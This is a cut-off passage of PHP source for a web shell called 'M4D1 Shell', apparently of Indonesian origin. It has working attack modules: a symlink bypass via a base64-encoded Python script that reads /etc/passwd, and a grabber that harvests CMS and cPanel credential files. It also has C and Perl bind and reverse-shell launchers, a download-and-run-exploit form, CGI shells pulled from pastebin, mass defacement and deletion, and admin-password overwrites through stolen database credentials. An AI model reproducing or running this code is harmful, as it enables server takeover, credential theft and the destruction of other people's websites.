								if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
								echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
								$dcount++;
							}
							fclose($file);
							echo "</table></center>";
							unlink("test.txt");
						} else
							echo "<center><font size=3>Cannot create Symlink</font></center>";
					}
				}
			} elseif (isset($_POST['symlink_py'])) {
				$sym_dir = mkdir('ia_sympy', 0755);
				chdir('ia_sympy');
				$file_sym = "sym.py";
				$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
				$sym = fopen($file_sym, "w");
				fwrite($sym, base64_decode($sym_script));
				chmod($file_sym, 0755);
				$jancok = exe("python sym.py");
				echo "<br><center>Done ... <a href='ia_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
			}
		} elseif (isset($_GET[hex('config')])) {
			$dir = path();
			if ($_POST) {
				$passwd = $_POST['passwd'];
				mkdir("Exc_config", 0777);
				$isi_htc = "Options all\nRequire None\nSatisfy Any";
				$htc = fopen("Exc_config/.htaccess", "w");
				fwrite($htc, $isi_htc);
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach ($user_config[1] as $user_Exc) {
					$user_config_dir = "/home/$user_Exc/public_html/";
					if (is_readable($user_config_dir)) {
						$grab_config = array(
							"/home/$user_Exc/.my.cnf" => "cpanel",
							"/home/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
							"/home/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home/$user_Exc/public_html/application/config/database.php" => "Ellislab",
							"/home1/$user_Exc/.my.cnf" => "cpanel",
							"/home1/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home1/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home1/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home1/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home1/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home1/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home1/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home1/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home1/$user_Exc/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home1/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home1/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home1/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home1/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home1/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home1/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home1/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home1/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home1/$user_Exc/public_html/application/config/database.php" => "Ellislab",
							"/home2/$user_Exc/.my.cnf" => "cpanel",
							"/home2/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home2/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home2/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home2/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home2/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home2/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home2/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home2/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home2/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
							"/home2/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home2/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home2/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home2/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home2/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home2/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home2/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home2/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home2/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home2/$user_Exc/public_html/application/config/database.php" => "Ellislab",
							"/home3/$user_Exc/.my.cnf" => "cpanel",
							"/home3/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home3/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home3/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home3/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home3/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home3/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home3/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home3/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home3/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
							"/home3/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home3/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home3/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home3/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home3/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home3/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home3/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home3/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home3/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home3/$user_Exc/public_html/application/config/database.php" => "Ellislab"
						);
						foreach ($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if ($ambil_config == '') {
							} else {
								$file_config = fopen("Exc_config/$user_Exc-$nama_config.txt", "w");
								fputs($file_config, $ambil_config);
							}
						}
					}
				}
				echo "<center><a class = 'ajx' href='?dir=$dir/Exc_config'><font color=lime>Done</font></a></center>";
			} else {
				$baru = hex($dir);
				$baru2 = hex('bypass-passwd');
				echo "<hr><br><center>";
				echo "<h2>Config Grabber M4D1 Shell</h2>";
				echo "<form method=\"post\" action=\"\"><center>etc/passwd ( Error ? <a class = 'ajx' href='?d=$baru&$baru2'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area form-control' rows='15' cols='60'>\n";
				echo file_get_contents('/etc/passwd');
				echo "</textarea><br><input type=\"submit\" value=\"Grab\" class = 'form-control' style='width:250px;'></td></tr></center>\n";
				echo "<br><hr>";
			}
		} elseif (isset($_GET[hex('network')])) {

			$dir = path();
			// bind connect with c
			if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
				$port = trim($_POST['port']);
				$passwrd = trim($_POST['bind_pass']);
				tulis("bdc.c", $port_bind_bd_c);
				exe("gcc -o bdc bdc.c");
				exe("chmod 777 bdc");
				@unlink("bdc.c");
				exe("./bdc " . $port . " " . $passwrd . " &");
				$scan = exe("ps aux");
				if (eregi("./bdc $por", $scan)) {
					$msg = "<p>Process found running, backdoor setup successfully.</p>";
				} else {
					$msg =  "<p>Process not found running, backdoor not setup successfully.</p>";
				}
			}
			// bind connect with perl
			elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
				$port = trim($_POST['port']);
				$passwrd = trim($_POST['bind_pass']);
				tulis("bdp", $port_bind_bd_pl);
				exe("chmod 777 bdp");
				$p2 = which("perl");
				exe($p2 . " bdp " . $port . " &");
				$scan = exe("ps aux");
				if (eregi("$p2 bdp $port", $scan)) {
					$msg = "<p>Process found running, backdoor setup successfully.</p>";
				} else {
					$msg = "<p>Process not found running, backdoor not setup successfully.</p>";
				}
			}
			// back connect with c
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
				$ip = trim($_POST['ip']);
				$port = trim($_POST['backport']);
				tulis("bcc.c", $back_connect_c);
				exe("gcc -o bcc bcc.c");
				exe("chmod 777 bcc");
				@unlink("bcc.c");
				exe("./bcc " . $ip . " " . $port . " &");
				$msg = "Now script try connect to " . $ip . " port " . $port . " ...";
			}
			// back connect with perl
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
				$ip = trim($_POST['ip']);
				$port = trim($_POST['backport']);
				tulis("bcp", $back_connect);
				exe("chmod +x bcp");
				$p2 = which("perl");
				exe($p2 . " bcp " . $ip . " " . $port . " &");
				$msg = "Now script try connect to " . $ip . " port " . $port . " ...";
			} elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
				$pilihan = trim($_POST['pilihan']);
				$wurl = trim($_POST['wurl']);
				$namafile = download($pilihan, $wurl);
				if (is_file($namafile)) {

					$msg = exe($wcmd);
				} else $msg = "error: file not found $namafile";
			}

		?>
			<hr><br>
			<center>
				<h2>Netsploit M4D1 Shell</h2>
				<table class="tabnet">
					<tr>
						<th>Port Binding</th>
						<th>Connect Back</th>
						<th>Load and Exploit</th>
					</tr>
					<tr>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>Port <br><br><br>Pass<br><br><br><br><br></td>
										<td><input class="form-control" type="text" name="port" size="26" value="<?php echo $bindport ?>"><br><br><input class="form-control" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="form-control" size="1" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input class="form-control" type="submit" name="bind" value="Bind" style="width:80px"></td>
									</tr>
								</form>
							</table>
						</td>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>IP<br><br><br>Port<br><br><br><br><br></td>
										<td><input class="form-control" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="form-control" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="form-control" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input type="submit" name="backconn" value="Connect" class="form-control" style="width:100px"></td>
									</tr>

								</form>
							</table>
						</td>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>url<br><br><br>cmd<br><br><br><br><br></td>
										<td><input class="form-control" type="text" name="wurl" style="width:220px;" value="www.some-code/exploits.c"><br><br><input class="form-control" type="text" name="wcmd" style="width:220px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="form-control" name="pilihan">
												<option value="wwget">wget</option>
												<option value="wlynx">lynx</option>
												<option value="wfread">fread</option>
												<option value="wfetch">fetch</option>
												<option value="wlinks">links</option>
												<option value="wget">GET</option>
												<option value="wcurl">curl</option>
											</select><br><input type="submit" name="expcompile" class="form-control" value="Go" style="width:80px;"></td>
									</tr>
								</form>
							</table>
						</td>
					</tr>
				</table>
			</center>
			<hr><br>
			<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
		<?php
		} elseif (isset($_GET[hex('cgi')])) {

			echo "<hr><br>";
			echo "<center>
						<h2> CGI M4D1 Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi' class = 'form-control' value = 'CGI Perl' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi2' class = 'form-control' value = 'CGI Perl 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgipy' class = 'form-control' value = 'CGI Python' style='width: 250px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";



			if (isset($_POST['cgi'])) {

				$cgi_dir = mkdir('ia_cgi', 0755);
				chdir('ia_cgi');
				$file_cgi = "cgi.Index_Attacker";
				$memeg = ".htaccess";
				$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Attacker \n AddHandler cgi-script .Index_Attacker \n AddHandler cgi-script .Index_Attacker";

				$htcgi = fopen(".htaccess", "w");

				$ch = curl_init("https://pastebin.com/raw/Lj46KxFT");
				$cgi = fopen($file_cgi, "w");
				curl_setopt($ch, CURLOPT_FILE, $cgi);
				curl_setopt($ch, CURLOPT_HEADER, 0);

				curl_exec($ch);
				curl_close($ch);
				fwrite($htcgi, $isi_htcgi);
				chmod($file_cgi, 0755);
				chmod($memeg, 0755);
				fclose($cgi);
				ob_flush();
				flush();
				echo "<br><center>Done ... <a href='$server/ia_cgi/cgi.Index_Attacker' target='_blank'>Klik Here</a>";
			} elseif (isset($_POST['cgi2'])) {

				$cgi_dir = mkdir('ia_cgi', 0755);
				chdir('ia_cgi');
				$file_cgi = "cgi2.Index_Attacker";
				$memeg = ".htaccess";
				$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Attacker \n AddHandler cgi-script .Index_Attacker ";
				$htcgi = fopen(".htaccess", "w");
				$ch = curl_init("https://pastebin.com/raw/ZPZMC6K4");
				$cgi = fopen($file_cgi, "w");
				curl_setopt($ch, CURLOPT_FILE, $cgi);
				curl_setopt($ch, CURLOPT_HEADER, 0);

				curl_exec($ch);
				curl_close($ch);
				fwrite($htcgi, $isi_htcgi);
				chmod($file_cgi, 0755);
				chmod($memeg, 0755);
				echo "<br><center>Done ... <a href='ia_cgi/cgi2.Index_Attacker' target='_blank'>Klik Here</a>";
			} elseif (isset($_POST['cgipy'])) {

				$cgi_dir = mkdir('ia_cgi', 0755);
				chdir('ia_cgi');
				$file_cgi = "cgipy.Index_Attacker";
				$memeg = ".htaccess";
				$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Attacker \n AddHandler cgi-script .Index_Attacker \n AddHandler cgi-script .Index_Attacker";
				$htcgi = fopen(".htaccess", "w");
				$ch = curl_init("https://pastebin.com/raw/MYyXAXyY");
				$cgi = fopen($file_cgi, "w");
				curl_setopt($ch, CURLOPT_FILE, $cgi);
				curl_setopt($ch, CURLOPT_HEADER, 0);

				curl_exec($ch);
				curl_close($ch);
				fwrite($htcgi, $isi_htcgi);
				chmod($file_cgi, 0755);
				chmod($memeg, 0755);
				echo "<br><center>Done ... <a href='ia_cgi/cgipy.Index_Attacker' target='_blank'>Klik Here</a>";
			}
		} elseif (isset($_GET[hex('mass_tool')])) {
			$dir = path();
			echo "<center><form action=\"\" method=\"post\">\n";
			$dirr = $_POST['d_dir'];
			$index = $_POST["script"];
			$index = str_replace('"', "'", $index);
			$index = stripslashes($index);
			function edit_file($file, $index)
			{
				if (is_writable($file)) {
					clear_fill($file, $index);
					echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
				} else {
					echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
				}
			}
			function hapus_massal($dir, $namafile)
			{
				if (is_writable($dir)) {
					$dira = scandir($dir);
					foreach ($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc . '/' . $namafile;
						if ($dirb === '.') {
							if (file_exists("$dir/$namafile")) {
								unlink("$dir/$namafile");
							}
						} elseif ($dirb === '..') {
							if (file_exists("" . dirname($dir) . "/$namafile")) {
								unlink("" . dirname($dir) . "/$namafile");
							}
						} else {
							if (is_dir($dirc)) {
								if (is_writable($dirc)) {
									if (file_exists($lokasi)) {
										echo "DELETED $lokasi<br>";
										unlink($lokasi);
										$idx = hapus_massal($dirc, $namafile);
									}
								}
							}
						}
					}
				}
			}
			function clear_fill($file, $index)
			{
				if (file_exists($file)) {
					$handle = fopen($file, 'w');
					fwrite($handle, '');
					fwrite($handle, $index);
					fclose($handle);
				}
			}

			function gass()
			{
				global $dirr, $index;
				chdir($dirr);
				$me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
				$files = scandir($dirr);
				$notallow = array(".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin", "access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "..", ".");
				sort($files);
				$n = 0;
				foreach ($files as $file) {
					if ($file != $me && is_dir($file) != 1 && !in_array($file, $notallow)) {
						echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
						edit_file($file, $index);
						flush();
						$n = $n + 1;
					}
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
			}
			function ListFiles($dirrall)
			{

				if ($dh = opendir($dirrall)) {

					$files = array();
					$inner_files = array();
					$me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
					$notallow = array($me, ".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin", "access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "Thumbs.db");
					while ($file = readdir($dh)) {
						if ($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow)) {
							if (is_dir($dirrall . "/" . $file)) {
								$inner_files = ListFiles($dirrall . "/" . $file);
								if (is_array($inner_files)) $files = array_merge($files, $inner_files);
							} else {
								array_push($files, $dirrall . "/" . $file);
							}
						}
					}

					closedir($dh);
					return $files;
				}
			}
			function gass_all()
			{
				global $index;
				$dirrall = $_POST['d_dir'];
				foreach (ListFiles($dirrall) as $key => $file) {
					$file = str_replace('//', "/", $file);
					echo "<center><strong>$file</strong> ===>";
					edit_file($file, $index);
					flush();
				}
				$key = $key + 1;
				echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>";
			}
			function sabun_massal($dir, $namafile, $isi_script)
			{
				if (is_writable($dir)) {
					$dira = scandir($dir);
					foreach ($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc . '/' . $namafile;
						if ($dirb === '.') {
							file_put_contents($lokasi, $isi_script);
						} elseif ($dirb === '..') {
							file_put_contents($lokasi, $isi_script);
						} else {
							if (is_dir($dirc)) {
								if (is_writable($dirc)) {
									echo "[<font color=lime>DONE</font>] $lokasi<br>";
									file_put_contents($lokasi, $isi_script);
									$idx = sabun_massal($dirc, $namafile, $isi_script);
								}
							}
						}
					}
				}
			}
			if ($_POST['mass'] == 'onedir') {
				echo "<br> Versi Text Area<br><textarea class = 'form-control' name='index' rows='10' cols='67'>\n";
				$ini = "http://";
				$mainpath = $_POST[d_dir];
				$file = $_POST[d_file];
				$dir = opendir("$mainpath");
				$code = base64_encode($_POST[script]);
				$indx = base64_decode($code);
				while ($row = readdir($dir)) {
					$start = @fopen("$row/$file", "w+");
					$finish = @fwrite($start, $indx);
					if ($finish) {
						echo "$ini$row/$file\n";
					}
				}
				echo "</textarea><br><b>Versi Text</b><br><br><br>\n";
				$mainpath = $_POST[d_dir];
				$file = $_POST[d_file];
				$dir = opendir("$mainpath");
				$code = base64_encode($_POST[script]);
				$indx = base64_decode($code);
				while ($row = readdir($dir)) {
					$start = @fopen("$row/$file", "w+");
					$finish = @fwrite($start, $indx);
					if ($finish) {
						echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>';
					}
				}
				echo "<hr>";
			} elseif ($_POST['mass'] == 'sabunkabeh') {
				gass();
			} elseif ($_POST['mass'] == 'hapusmassal') {
				hapus_massal($_POST['d_dir'], $_POST['d_file']);
			} elseif ($_POST['mass'] == 'sabunmematikan') {
				gass_all();
			} elseif ($_POST['mass'] == 'massdeface') {
				echo "<div style='margin: 5px auto; padding: 5px'>";
				sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
				echo "</div>";
			} else {
				echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files M4D1 Shell</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"form-control\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input class= 'form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input class= 'form-control' type='text' name='d_file' value='Exc.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea class= 'form-control' name='script' style='width: 450px; height: 200px;'>Hacked By M4DI~UciH4</textarea><br>
		<input class= 'form-control' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center><hr><br>";
			}
		} elseif (isset($_GET[hex('mass_user')])) {
			if ($_POST['hajar']) {
				if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
					print "username atau password harus lebih dari 6 karakter";
				} else {
					$user_baru = $_POST['user_baru'];
					$pass_baru = md5($_POST['pass_baru']);
					$conf = $_POST['config_dir'];

					if (preg_match("/^http:\/\//", $conf) or preg_match("/^https:\/\//", $conf)) {
						$get = curl($conf);
						preg_match_all('/<a href="(.*?).txt">/', $get, $link);
						foreach ($link[1] as $link_config) {
							$scan_conf[] = "$link_config.txt";
						}
					} else {
						$scan_conf = scandir($conf);
					}

					foreach ($scan_conf as $file_conf) {
						$config = file_get_contents("$conf/$file_conf");
						if (preg_match("/JConfig|joomla/", $config)) {
							$dbhost = getValue($config, "host = '", "'");
							$dbuser = getValue($config, "user = '", "'");
							$dbpass = getValue($config, "password = '", "'");
							$dbname = getValue($config, "db = '", "'");
							$dbprefix = getValue($config, "dbprefix = '", "'");
							$prefix = $dbprefix . "users";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
							$result = mysql_fetch_array($q);
							$id = $result['id'];
							$site = getValue($config, "sitename = '", "'");
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Joomla<br>";
							if ($site == '') {
								print "Sitename => " . color(1, 1, "Can't get domain name") . "<br>";
							} else {
								print "Sitename => $site<br>";
							}
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/WordPress/", $config)) {
							$dbhost = getValue($config, "DB_HOST', '", "'");
							$dbuser = getValue($config, "DB_USER', '", "'");
							$dbpass = getValue($config, "DB_PASSWORD', '", "'");
							$dbname = getValue($config, "DB_NAME', '", "'");
							$dbprefix = getValue($config, "table_prefix  = '", "'");
							$prefix = $dbprefix . "users";
							$option = $dbprefix . "options";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[ID];
							$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
							$result2 = mysql_fetch_array($q2);
							$target = $result2[option_value];
							if ($target == '') {
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
							} else {
								$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
							}
